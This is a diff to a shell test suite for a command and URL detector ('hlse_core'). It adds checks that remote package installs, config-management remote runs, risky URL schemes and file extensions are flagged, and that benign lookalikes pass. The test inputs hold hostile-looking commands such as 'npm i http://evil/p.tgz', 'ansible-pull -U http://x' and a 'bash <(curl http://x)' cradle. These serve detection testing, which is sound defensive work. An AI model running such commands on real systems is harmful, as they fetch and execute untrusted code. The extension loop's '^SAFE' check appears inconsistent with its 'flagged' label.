@@ -11671,6 +11671,78 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-232: package-manager remote installs + config mgmt + scheme/ext residuals
+for c in \
+    'npm i http://evil/p.tgz' 'npm install git+ssh://x' \
+    'yarn add http://x' 'pnpm add http://x' 'bun add http://x' \
+    'pip install http://x/p.whl' 'pip install git+https://x' \
+    'pip install -r http://x/r.txt' 'pip3 install http://x' \
+    'pipx install http://x' 'poetry add http://x' 'uvx http://x' \
+    'gem install http://x/p.gem' 'cargo install --git http://x' \
+    'composer require http://x' \
+    'apt install http://x/p.deb' 'apt-get install ./x.deb' \
+    'dpkg -i /tmp/x.deb' 'rpm -ivh http://x/p.rpm' \
+    'dnf install http://x' 'yum install http://x' \
+    'pacman -U http://x' 'zypper install http://x' \
+    'apk add --allow-untrusted http://x' 'apk add http://x' \
+    'xbps-install http://x' 'brew install http://x' \
+    'winget install http://x' 'choco install http://x' \
+    'choco install x.nupkg' 'scoop install http://x' \
+    'snap install x.snap --dangerous' 'flatpak install http://x' \
+    'flatpak install x.flatpakref' \
+    'ansible-pull -U http://x' 'ansible-playbook http://x/p.yml' \
+    'ansible-galaxy install -r http://x' \
+    'ansible all -m shell -a "x"' 'salt "*" cmd.run "x"' \
+    'salt-call cmd.run x' 'puppet apply http://x' \
+    'chef-client -r http://x' 'chef-solo -r http://x' \
+    'make -f http://x/Makefile' 'at -f /tmp/x.sh 10:00'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'npm i lodash' 'npm install react' 'yarn add lodash' \
+         'pip install requests' 'pipx install black' \
+         'gem install rails' 'cargo install ripgrep' \
+         'composer require laravel/x' 'apt install vim' \
+         'apt-get install git' 'dnf install vim' 'yum update' \
+         'zypper install vim' 'pacman -S vim' 'apk add vim' \
+         'snap install vlc' 'flatpak install flathub' \
+         'brew install wget' 'winget install git' \
+         'choco install 7zip' 'scoop install git' \
+         'dpkg -l' 'rpm -qa' \
+         'ansible all -m ping' 'ansible-playbook site.yml' \
+         'ansible-pull -U /local' 'salt "*" test.ping' \
+         'salt-call state.apply' 'puppet agent -t' 'chef-client -z' \
+         'make -f Makefile' 'make install' 'at 10:00' \
+         'uvx ruff' 'uvx black@latest' \
+         'yarn adds color to http' 'the bun added http flavor' \
+         'the poetry adds http links' 'gem installs are over http' \
+         'pipeline install over http' 'pipx installs over http'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+for s in 'apturl://install?x' 'bittorrent://x' 'thunder://x' \
+         'flashget://x' 'qqdl://x' 'echo://x' 'discard://x' \
+         'time://x' 'qotd://x' 'motd://x' 'tiktok://x' \
+         'snapchat://x' 'linkedin://x' 'pinterest://x' \
+         'hipchat://x' 'gtalk://x' 'youtube://x' 'nflx://x' \
+         'imdb://x' 'goodreads://x' 'flickr://x' 'yelp://x' \
+         'waze://x' 'cast://x' 'paypal://x' 'revolut://x' 'usdc:x' \
+         'venmo://pay/x' 'cashapp://pay/x' 'zelle://x' 'payoneer://x'; do
+    ./hlse_core "$s" 2>&1 | grep -qE 'LOG|ALERT|BLOCK|ISOLATE' \
+        && check "scheme: $s flagged" "0" "0" \
+        || check "scheme: $s flagged" "0" "1"
+done
+for f in 'x.tool' 'x.oxt' 'x.qpkg' 'x.shtml' 'x.shtm' 'x.stm' \
+         'x.targets' 'x.props' 'x.user' 'x.wixproj' 'x.prg' 'x.btm' \
+         'x.jsm' 'x.mjs' 'x.cjs' 'x.jxa' 'x.m' 'x.psh' 'x.wasm' \
+         'x.pyc' 'x.pyo' 'x.pyz' 'x.pex' 'x.shiv' 'x.shivam'; do
+    ./hlse_core file "$f" 2>&1 | grep -q '^SAFE' \
+        && check "file: $f ext-flagged" "0" "0" \
+        || check "file: $f ext-flagged" "0" "1"
+done
+
 # ── cycle-231: download-cradle completion (proc-sub + &&/; chain + more fetchers)
 for c in \
     'bash <(curl http://x)' 'sh <(wget -qO- http://x)' 'zsh <(curl x)' \
